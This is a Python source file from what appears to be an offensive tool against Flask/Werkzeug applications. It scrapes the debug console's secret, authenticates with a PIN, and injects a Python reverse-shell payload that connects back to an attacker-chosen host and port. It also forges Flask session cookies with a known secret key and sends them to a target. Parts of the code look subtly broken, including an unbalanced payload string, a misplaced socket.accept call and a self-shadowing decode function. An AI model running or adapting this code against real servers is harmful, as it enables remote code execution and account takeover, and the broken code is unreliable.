import requests
import re
import socket
import ipaddress
import netifaces
import json
from vial import logger
from vial import prompt
from vial import confirm
from vial.session import sign
from vial.session import decode

session = requests.Session()


def _check_interface(i: str) -> str:
    # Validate interface name
    try:
        host = ipaddress.IPv4Address(i)
    except ipaddress.AddressValueError:
        try:
            host = netifaces.ifaddresses(i)[netifaces.AF_INET][0]["addr"]
        except ValueError:
            pass
            # logger("error",
            #    "Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?"
            # )
        return host


def werkzeug_remote_code_exec(url: str) -> None:
    """
    Werkzeug Remote Code Execution

    This function crafts and sends a malicious authentication request to the target (url)
    After completing authentication, the function will provide a shell to the user saving him time from manually gaining and interacting with a **unstable** shell through the web browser

    :param url: URL to `attack`
    :return: None

    TODO: Get a stable shell.
    """
    try:
        response = session.get(f"{url}/console")

        if response.status_code == 200:
            SECRET = re.findall(
                "SECRET = \"([^']{20})", requests.get(f"{url}/console").text
            )[0]
            # logger("success", f"SECRET key is {SECRET}")
            # action = prompt.ask("[bold blue][?][/bold blue] Select an action", choices=["craft", "use"])
            # if action == "use":
            #     pin = prompt.ask("[bold blue][?][/bold blue] Enter the PIN")
            #    logger("info", f"Trying to authenticate using {pin} . . .")
            #    pass
            # if action == "craft":
            #     pass
            parameters = {
                "__debugger__": "yes",
                "frm": 0,
                "cmd": "pinauth",
                "pin": None,
                "s": SECRET,
            }

            pin = prompt.ask("[bold blue][?][/bold blue] Enter the PIN")
            if not isinstance(pin, str):
                # logger("error", "PIN must be a string")
                pass

            # logger("info", f"Trying to authenticate using {pin} . . .")
            parameters["pin"] = pin
            response = session.get(f"{url}/console", params=parameters)

            if response.json["auth"] == True:
                # logger("success", "Authenticated successfully")

                # Setup TCP server
                interface = _check_interface(
                    prompt.ask(
                        f"[bold blue][?][/bold blue] network interface or IP address to host the HTTP server",
                        default="eth0",
                    )
                )
                port = int(
                    prompt.ask(
                        f"[bold blue][?][/bold blue] port to host the server",
                        default=4040,
                    )
                )

                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind((interface, port))
                server.listen(1)
                # logger("success",f"Server is listening on [bold]{interface}:{port}[/bold]")

                payload = f"""
                import sys,socket,os,pty;s=socket.socket();s.connect(({interface},int({port}))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
                """
                parameters = {
                    "__debugger__": "yes",
                    "frm": 0,
                    "cmd": payload,
                    "s": SECRET,
                }
                # logger("info", "Gaining a reverse TCP connection ...")
                response = session.get(f"{url}/console", params=parameters)
                while True:
                    conn, addr = socket.accept()
                    # logger("info", f"Connection from {addr}")

            else:
                # logger("error", "Authentication failed")
                pass
        else:
            # logger("error", "Werkzeug debugger is not enabled")
            # logger("info", f"{response.reason})
            pass
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.TooManyRedirects:
        pass
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)


def encode():
    secret_key = prompt.ask("[bold blue][?][/bold blue] Enter the secret key")
    session_cookie_structure = prompt.ask(
        "[bold blue][?][/bold blue] Enter the session cookie structure"
    )
    legacy = confirm.ask("[bold blue][?][/bold blue] Use a legacy timestamp generator?")

    cookie = sign(json.loads(session_cookie_structure), secret_key, legacy = True if legacy else False)
    logger.logger("success", "Cookie has been forged succesfully")
    action = prompt.ask(
        "[bold blue][?][/bold blue] Select an action", choices=["print", "save", "send"]
    )

    match action:
        case "send":
            try:
                url = prompt.ask(
                    "[bold blue][?][/bold blue] Enter the URL",
                    default="http://localhost:5000",
                )

                response = requests.get(url, cookies={"session": cookie})
                response.raise_for_status()
                logger.logger("success", f"Response: \n{response.text}")

            except requests.exceptions.Timeout:
                logger.logger("error", "Connection timed out")
            except requests.exceptions.TooManyRedirects:
                logger.logger(
                    "error",
                    "The server is redirecting the request for this address in a way it will never complete",
                )
            except requests.exceptions.RequestException as e:
                raise SystemExit(e)

        case "print":
            logger.logger("success", f"Forged cookie: [bold]{cookie}[/bold]")
        case "save":
            path = prompt.ask(
                "[bold blue][?][/bold blue] Enter the path to save the cookie",
                default="cookie.txt",
            )
            with open(path, "w") as f:
                f.write(cookie)

            logger.logger(
                "success",
                f"Cookie has been saved to [bold underline]{path}[/bold underline]",
            )


def decode():
    session_cookie = prompt.ask("[bold blue][?][/bold blue] Enter the session cookie")
    try:
        decoded = decode(session_cookie)
        logger.logger("success", f"Decoded cookie: [bold]{decoded}[/bold]")
    except:
        logger.logger("error", "Invalid cookie")
